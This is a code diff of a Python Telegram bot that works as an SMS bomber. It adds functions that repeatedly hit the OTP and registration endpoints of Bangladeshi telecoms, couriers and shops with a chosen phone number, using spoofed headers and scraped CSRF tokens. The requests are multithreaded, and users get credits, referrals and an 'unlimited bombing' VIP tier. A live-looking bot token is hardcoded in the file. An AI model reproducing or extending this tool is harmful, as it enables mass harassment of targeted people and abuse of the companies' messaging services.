@@ -10,7 +10,7 @@ from flask import Flask
 from telebot import types
 
 # ==========================================
-# 🌐 WEB SERVER
+# 🌐 WEB SERVER (Keep Alive)
 # ==========================================
 app = Flask('')
 @app.route('/')
@@ -23,10 +23,10 @@ def keep_alive():
     threading.Thread(target=run_web_server, daemon=True).start()
 
 # ==========================================
-# 🔧 CONFIGURATION (আপনার Numeric ID এখানে দিন)
+# 🔧 CONFIGURATION (আপনার আইডি দিন)
 # ==========================================
 API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
-OWNER_ID = 6941003064              # <--- আপনার সঠিক ID এখানে দিন
+OWNER_ID = 6941003064              # <--- আপনার সঠিক Numeric ID এখানে দিন
 OWNER_NAME = "Suptho Hpd"
 OWNER_USERNAME = "@Suptho1_"
 CHANNEL_ID = "@SH_tricks"         
@@ -50,11 +50,31 @@ def save_data(data):
 db = load_data()
 
 # ==========================================
-# 🚀 API ENGINE (১৩টি অরিজিনাল API)
+# 🚀 API ENGINE (20 APIs)
 # ==========================================
 
+def robi_api(target):
+    try:
+        url = "https://www.robi.com.bd/bn"
+        headers = {"Host": "www.robi.com.bd", "Connection": "keep-alive", "sec-ch-ua-platform": '"Android"', "Next-Action": "7f4406e6c8a68caaa35cda690d810259f50cb53c3c", "User-Agent": "Mozilla/5.0 (Linux; Android 12; Infinix X669C)", "Accept": "text/x-component", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.robi.com.bd", "Referer": "https://www.robi.com.bd/bn"}
+        data = f'[{"{"}"msisdn":"{target}"{"}"}]'
+        requests.post(url, headers=headers, data=data, timeout=3)
+    except: pass
+
+def airtel_api(target):
+    try:
+        url = "https://www.bd.airtel.com/en"
+        headers = {"Host": "www.bd.airtel.com", "Connection": "keep-alive", "sec-ch-ua-platform": '"Android"', "next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e", "User-Agent": "Mozilla/5.0", "Accept": "text/x-component", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.bd.airtel.com", "Referer": "https://www.bd.airtel.com/en"}
+        data = f'[{"{"}"msisdn":"{target}"{"}"}]'
+        requests.post(url, headers=headers, data=data, timeout=3)
+    except: pass
+
+def grameenphone_api(target):
+    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f"msisdn={target}", timeout=3)
+    except: pass
+
 def shopbase_api(target):
-    try: requests.post("https://shopbasebd.com/store/registration/sendOTP", data=f"number={target}&_token=ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo", timeout=3)
+    try: requests.post("https://shopbasebd.com/store/registration/sendOTP", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, data=f"number={target}&_token=fbCftgSv6QSCDj0aYABGdeQKwggdMaKW0ifdhfsp", timeout=3)
     except: pass
 
 def apex_api(target):
@@ -69,14 +89,6 @@ def banglalink_api(target):
     try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": target}, timeout=3)
     except: pass
 
-def grameenphone_api(target):
-    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", data=f"msisdn={target}", timeout=3)
-    except: pass
-
-def airtel_api(target):
-    try: requests.post("https://www.bd.airtel.com/en", headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"}, data=f'[{"msisdn":"{target}"}]', timeout=3)
-    except: pass
-
 def chorki_api(target):
     try: requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
     except: pass
@@ -87,10 +99,6 @@ def hoichoi_api(target):
 
 def bioscope_api(target):
     try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
-    except: pass
-
-def shikho_api(target):
-    try: requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": f"88{target}", "type": "student", "auth_type": "signup", "vendor": "shikho"}, timeout=3)
     except: pass
 
 def bohubrihi_api(target):
@@ -105,28 +113,79 @@ def ecourier_api(target):
     try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=3)
     except: pass
 
+def eonbazar_api(target):
+    try: requests.post("https://app.eonbazar.com/api/auth/login", json={"method": "otp", "mobile": target}, headers={"content-type": "application/json"}, timeout=3)
+    except: pass
+
+def rabbithole_api(target):
+    try: requests.post("https://apix.rabbitholebd.com/appv2/login/requestOTP", json={"mobile": f"+88{target}"}, headers={"content-type": "application/json"}, timeout=3)
+    except: pass
+
+def osudpotro_api(target):
+    try: requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{target}", "deviceToken": "web", "language": "en", "os": "web"}, headers={"content-type": "application/json;charset=UTF-8"}, timeout=3)
+    except: pass
+
+def fundesh_api(target):
+    try: requests.post("https://fundesh.com.bd/api/auth/resendOTP", json={"msisdn": target[-10:]}, headers={"content-type": "application/json; charset=UTF-8"}, timeout=3)
+    except: pass
+
+def paperfly_api(target):
+    try:
+        rand_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
+        requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"full_name": "PF", "company_name": "Ex", "email_address": rand_email, "phone_number": target}, headers={"content-type": "application/json"}, timeout=3)
+    except: pass
+
+def sundarban_api(target):
+    try:
+        query = """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"""
+        requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": target}}, "query": query}, headers={"content-type": "application/json"}, timeout=3)
+    except: pass
+
+def paragon_api(target):
+    try: requests.post("https://www.paragonfood.com.bd/Customer/SendOTP", data={"phoneNumber": target, "otpTypeId": "2", "__RequestVerificationToken": "CfDJ8Aodwe6hDBdPthjewNanGbwdV_aATsmlMUUY5pv1dF9-XzNx0VxbzekITiBrs-Ay2kNUr0LoH9hVuU4l20ocBm3YvzpL7K2Udskhiol-9hDRZSI2mBOqj1agCdocW3alTqWKQrvlDbyCY_3XIO0YEds"}, headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, timeout=3)
+    except: pass
+
 def attack_executor(target, amount):
-    apis = [shopbase_api, apex_api, bikroy_api, banglalink_api, grameenphone_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, shikho_api, bohubrihi_api, rokomari_api, ecourier_api]
+    # Total 20 APIs
+    apis = [robi_api, grameenphone_api, shopbase_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, rokomari_api, ecourier_api, eonbazar_api, rabbithole_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, paragon_api]
     with ThreadPoolExecutor(max_workers=50) as executor:
         for _ in range(amount):
             for run_api in apis:
                 executor.submit(run_api, target)
 
 # ==========================================
-# 👑 ADMIN COMMANDS (Fix)
+# 👑 ADMIN COMMANDS (With VIP)
 # ==========================================
 
-@bot.message_handler(commands=['admin', 'stats', 'gencodes', 'broadcast', 'ban', 'unban'])
+@bot.message_handler(commands=['admin', 'stats', 'gencodes', 'broadcast', 'ban', 'unban', 'addvip', 'removevip'])
 def admin_panel(message):
-    # ID চেক করার সময় int এবং str দুইটাই সাপোর্ট করবে
     if int(message.from_user.id) != int(OWNER_ID):
         return
     
     cmd = message.text.split()
     if cmd[0] == '/admin':
-        text = "👑 **ADMIN PANEL**\n\n/stats - বটের তথ্য\n/gencodes <সংখ্যা> - কোড তৈরি\n/broadcast <মেসেজ> - ব্রডকাস্ট\n/ban <ID> - ইউজার ব্যান\n/unban <ID> - ইউজার আনব্যান"
+        text = "👑 **ADMIN PANEL**\n\n/addvip <id> - Make VIP\n/removevip <id> - Remove VIP\n/gencodes <num> - Gen Codes\n/broadcast <msg> - Broadcast\n/ban <id> - Ban User"
         bot.reply_to(message, text)
     
+    elif cmd[0] == '/addvip':
+        if len(cmd) > 1:
+            uid = cmd[1]
+            if uid in db['users']:
+                db['users'][uid]['plan'] = 'vip'
+                save_data(db)
+                bot.reply_to(message, f"✅ User {uid} is now VIP (Unlimited).")
+                try: bot.send_message(uid, "🎉 Congratulations! You are now a VIP user. Unlimited bombing enabled!")
+                except: pass
+            else: bot.reply_to(message, "❌ User not found in DB (User must start bot first).")
+            
+    elif cmd[0] == '/removevip':
+        if len(cmd) > 1:
+            uid = cmd[1]
+            if uid in db['users']:
+                db['users'][uid]['plan'] = 'free'
+                save_data(db)
+                bot.reply_to(message, f"❌ User {uid} removed from VIP.")
+
     elif cmd[0] == '/stats':
         bot.reply_to(message, f"📊 **Stats:**\nUsers: {len(db['users'])}\nBanned: {len(db.get('banned', []))}\nCodes: {len(db.get('codes', []))}")
     
@@ -137,15 +196,24 @@ def admin_panel(message):
             db.setdefault('codes', []).extend(new_codes)
             save_data(db)
             bot.reply_to(message, f"✅ Generated {num} Codes:\n`{', '.join(new_codes)}`", parse_mode='Markdown')
-        except: bot.reply_to(message, "সঠিক নিয়ম: `/gencodes 5`")
+        except: bot.reply_to(message, "Usage: `/gencodes 5`")
 
     elif cmd[0] == '/broadcast':
         msg_text = message.text.replace("/broadcast ", "")
+        if len(msg_text) < 2: return
         count = 0
         for u in db['users']:
             try: bot.send_message(u, f"📢 **ADMIN MESSAGE:**\n\n{msg_text}"); count += 1
             except: pass
-        bot.reply_to(message, f"✅ {count} জনকে পাঠানো হয়েছে।")
+        bot.reply_to(message, f"✅ Sent to {count} users.")
+
+    elif cmd[0] == '/ban':
+        if len(cmd) > 1:
+            db.setdefault('banned', []).append(cmd[1]); save_data(db); bot.reply_to(message, f"✅ Banned {cmd[1]}")
+
+    elif cmd[0] == '/unban':
+        if len(cmd) > 1 and cmd[1] in db.get('banned', []):
+            db['banned'].remove(cmd[1]); save_data(db); bot.reply_to(message, f"✅ Unbanned {cmd[1]}")
 
 # ==========================================
 # 🤖 USER INTERFACE
@@ -171,7 +239,7 @@ def welcome(message):
             db['users'][referrer]['credits'] += 5
             try: bot.send_message(referrer, "🎉 Referral Bonus: +5 Credits!")
             except: pass
-        db['users'][uid] = {"credits": 5}
+        db['users'][uid] = {"credits": 5, "plan": "free"}
         save_data(db)
 
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
@@ -193,8 +261,9 @@ def menu_logic(message):
         bot.register_next_step_handler(msg, ask_amount)
     elif message.text == "👤 Profile":
         u = db['users'].get(uid, {})
-        cred = "Unlimited" if int(uid) == int(OWNER_ID) else u.get('credits', 0)
-        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💰 Balance: `{cred}`", parse_mode='Markdown')
+        plan = u.get('plan', 'free').upper()
+        cred = "Unlimited" if int(uid) == int(OWNER_ID) or plan == "VIP" else u.get('credits', 0)
+        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💎 Plan: **{plan}**\n💰 Balance: `{cred}`", parse_mode='Markdown')
     elif message.text == "👥 Refer & Earn":
         link = f"https://t.me/{bot.get_me().username}?start={uid}"
         bot.reply_to(message, f"🎁 Invite link:\n`{link}`\n\nপ্রতি রেফারে ৫ ক্রেডিট।")
@@ -209,11 +278,16 @@ def ask_amount(message):
 
 def process_bomb(message, target):
     uid = str(message.from_user.id)
+    u_data = db['users'].get(uid, {})
+    is_vip = u_data.get('plan') == 'vip'
+    
     try:
         amount = int(message.text)
-        if int(uid) != int(OWNER_ID):
-            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই!")
+        # Owner or VIP user won't lose credits
+        if int(uid) != int(OWNER_ID) and not is_vip:
+            if u_data['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই! Refer বা Redeem করুন।")
             db['users'][uid]['credits'] -= 1; save_data(db)
+        
         bot.reply_to(message, "🚀 বোম্বিং শুরু হয়েছে!")
         threading.Thread(target=attack_executor, args=(target, amount)).start()
     except: bot.reply_to(message, "❌ ভুল পরিমাণ!")
@@ -227,4 +301,10 @@ def process_redeem(message):
 
 if __name__ == "__main__":
     keep_alive()
+    # ✅ Webhook Remove Logic Added Here
+    try:
+        bot.remove_webhook()
+        print("Webhook removed!")
+    except Exception as e:
+        print(e)
     bot.polling(non_stop=True)
